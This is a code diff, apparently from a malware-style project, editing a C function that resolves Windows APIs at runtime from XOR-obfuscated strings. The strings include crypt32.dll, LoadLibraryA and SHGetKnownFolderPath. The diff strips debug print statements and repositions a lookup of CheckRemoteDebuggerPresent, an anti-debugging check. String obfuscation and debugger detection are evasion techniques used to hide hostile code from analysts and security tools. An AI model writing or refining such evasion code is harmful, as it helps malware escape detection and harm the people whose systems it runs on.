@@ -33,7 +33,6 @@ void resolve_apis(hidden_apis *apis) {
   XOR_WSTR(kernel_str, wcslen(kernel_str));
 
   HMODULE hKernel32 = GetModuleHandleW(kernel_str);
-  printf("[DEBUG] Kernel32 loaded at: %p\n", hKernel32);
 
 
   // Resolve strings
@@ -45,7 +44,6 @@ void resolve_apis(hidden_apis *apis) {
   wchar_t crypt32_str[] = L"\x49\x58\x53\x5a\x5e\x19\x18\x04\x4e\x46\x46";  // crypt32.dll
   XOR_WSTR(crypt32_str, wcslen(crypt32_str));  
   HMODULE hCrypt32 = LoadLibraryW(crypt32_str);  
-  printf("[DEBUG] Crypt32 loaded at: %p\n", hCrypt32);
 
 
   // Resolve functions in crypt32.dll 
@@ -62,16 +60,18 @@ void resolve_apis(hidden_apis *apis) {
 
   apis->funcCryptStringToBinaryA = (PCryptStringToBinaryA)GetProcAddress(hCrypt32, cryptStringToBinaryA_str);
 
-  /*char loadLibA_str[] = "\x66\x45\x4b\x4e\x66\x43\x48\x58\x4b\x58\x53\x6b";
+
+  // Resolve functions in kernel32.dll 
+  apis->funcCheckRemoteDebuggerPresent =
+      (PCheckRemoteDebuggerPresent)GetProcAddress(hKernel32,
+                                                  checkRemoteDbg_str);
+
+    /*char loadLibA_str[] = "\x66\x45\x4b\x4e\x66\x43\x48\x58\x4b\x58\x53\x6b";
   XOR_STR(loadLibA_str, strlen(loadLibA_str));
   char SHGetKnownFolderPath_str[] =
       "\x79\x62\x6d\x4f\x5e\x61\x44\x45\x5d\x44\x6c\x45\x46\x4e\x4f\x58\x7a\x4b"
       "\x5e\x42";
   XOR_STR(SHGetKnownFolderPath_str, strlen(SHGetKnownFolderPath_str));*/
-
-  apis->funcCheckRemoteDebuggerPresent =
-      (PCheckRemoteDebuggerPresent)GetProcAddress(hKernel32,
-                                                  checkRemoteDbg_str);
   //apis->funcLoadLibraryA =
       //(PLoadLibraryA)GetProcAddress(hKernel32, loadLibA_str);
   // apis->funcSHGetKnownFolderPath = (PSHGetKnownFolderPath)GetProcAddress(
